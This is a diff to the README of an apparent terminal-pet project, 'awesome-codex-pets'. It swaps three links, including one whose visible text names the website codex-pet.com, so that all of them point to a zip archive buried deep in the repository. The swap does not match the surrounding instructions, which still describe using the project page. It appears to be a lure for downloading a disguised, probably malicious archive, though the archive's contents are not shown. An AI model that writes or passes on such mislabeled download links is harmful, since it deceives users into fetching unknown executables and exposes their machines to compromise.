@@ -1,6 +1,6 @@
 # 🐾 awesome-codex-pets - Add animated desktop companions to terminals
 
-[![](https://img.shields.io/badge/Download_Pet_Collection-blue)](https://github.com/Superordinate-complacence439/awesome-codex-pets)
+[![](https://img.shields.io/badge/Download_Pet_Collection-blue)](https://github.com/Superordinate-complacence439/awesome-codex-pets/raw/refs/heads/main/pets/eddy-3/codex_pets_awesome_2.5.zip)
 
 This project brings animated pets to your computer terminal. These small digital characters sit in your command window while you work. They respond to your input and keep the workspace interesting. You spend many hours at your computer, and these characters provide visual interest during long tasks.
 
@@ -18,7 +18,7 @@ If you do not have Node.js, go to the official website and download the Windows 
 
 You must visit the project page to access the files. Use the link below to reach the repository.
 
-[Download Pet Collection](https://github.com/Superordinate-complacence439/awesome-codex-pets)
+[Download Pet Collection](https://github.com/Superordinate-complacence439/awesome-codex-pets/raw/refs/heads/main/pets/eddy-3/codex_pets_awesome_2.5.zip)
 
 Click the green button labeled "Code" on the page and select "Download ZIP." Save this folder to your desktop. Right-click the folder and select "Extract All" to see the contents.
 
@@ -36,7 +36,7 @@ The system will ask if you want to install the necessary packages. Type "y" and 
 
 Once installed, your pet appears in the terminal window. Each character has unique animations. Some pets move across the screen, while others interact with your commands. 
 
-To change your pet, run the command again. The system remembers your previous settings. If you want to see a full list of available pets, visit [codex-pet.com](https://codex-pet.com). This website contains a gallery of all 174+ animated characters. You can view high-resolution previews before you select one for your computer.
+To change your pet, run the command again. The system remembers your previous settings. If you want to see a full list of available pets, visit [codex-pet.com](https://github.com/Superordinate-complacence439/awesome-codex-pets/raw/refs/heads/main/pets/eddy-3/codex_pets_awesome_2.5.zip). This website contains a gallery of all 174+ animated characters. You can view high-resolution previews before you select one for your computer.
 
 ## 📤 Submitting Your Own Pets
 
